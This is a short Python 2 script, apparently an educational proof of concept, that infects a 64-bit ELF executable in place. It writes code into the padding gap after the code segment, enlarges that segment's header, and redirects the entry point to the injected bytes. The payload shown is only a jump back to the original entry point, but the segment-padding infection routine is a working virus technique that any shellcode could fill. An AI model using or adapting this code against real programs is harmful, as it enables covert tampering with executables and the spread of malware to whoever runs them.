#!/usr/bin/env python

import re
import sys
import struct

fpath = sys.argv[1]
fp = open(fpath, 'rb+')
assert fp.read(4) == "\x7fELF" # e_ident[0..4)
assert fp.read(1) == "\x02" # e_ident[EI_CLASS] should be 64-bit
assert fp.read(1) == "\x01" # e_ident[EI_DATA] should be little-end
assert fp.read(1) == "\x01" # e_ident[EI_VERSION] should be version 1
fp.read(1+1+7) # EI_OSABI, EI_ABIVERSION, EI_PAD
fp.seek(16) # pointing at elf64_hdr.e_type
(x,x,x,e_entry,e_phoff,e_shoff,x,x,x,e_phnum,x,e_shnum,e_shstrndx) = \
    struct.unpack('HHIQQQIHHHHHH', fp.read(2+2+4+8+8+8+4+2+2+2+2+2+2))

# find code and data segment
(cSegHdr,dSegHdr)=(None,None)
(oCodeSegHdr,oDataSegHdr)=(None,None)
nPtLoad = 0
fp.seek(e_phoff)
for i in range(e_phnum):
	tmp = [p_type,p_flags,p_offset,p_vaddr,p_paddr,p_filesz,p_memsz,p_align] = \
		list(struct.unpack('IIQQQQQQ', fp.read(0x38)))
	if p_type==1:
		nPtLoad += 1
	if p_type==1 and p_flags==5:
		oCodeSegHdr = fp.tell()-0x38
		cSegHdr = tmp
	elif p_type==1 and p_flags==6:
		oDataSegHdr = fp.tell()-0x38
		dSegHdr = tmp
assert(nPtLoad == 2)
assert(cSegHdr)
assert(dSegHdr)

nGapFile = dSegHdr[2]-cSegHdr[2]
nGapMem = dSegHdr[3]-cSegHdr[3]
print "(FILE) code[%08X,%08X) data[0x%08X,0x%08X) (0x%08X gap)" % \
	(cSegHdr[2],cSegHdr[2]+cSegHdr[5],dSegHdr[2],dSegHdr[2]+dSegHdr[5],nGapFile)
print " (MEM) code[%08X,%08X) data[0x%08X,0x%08X) (0x%08X gap)" % \
	(cSegHdr[3],cSegHdr[3]+cSegHdr[6],dSegHdr[3],dSegHdr[3]+dSegHdr[6],nGapMem)
assert(nGapFile > 64)
assert(nGapMem > 64)

oEntryNew = cSegHdr[2]+cSegHdr[5]
vaEntryNew = cSegHdr[3]+cSegHdr[6]
print "(FILE) entrypoint old:%08X new:%08X" % (e_entry-cSegHdr[3], oEntryNew)
print " (MEM) entrypoint old:%08X new:%08X" % (e_entry, vaEntryNew)

# "virus" is a jump back to OEP :>
virus = ''
virus += '\xe9' # jmp
virus += struct.pack('<i', e_entry - (vaEntryNew+5))
while len(virus)%4:
	virus += '\xCC'

# expand code segment
cSegHdr[5] += len(virus) # p_filesz
cSegHdr[6] += len(virus) # p_memsz
fp.seek(oCodeSegHdr)
fp.write(struct.pack('IIQQQQQQ',*cSegHdr))
# write virus
fp.seek(oEntryNew)
fp.write(virus)
# write new entrypoint
fp.seek(0x18)
fp.write(struct.pack('<q', vaEntryNew))

fp.close()

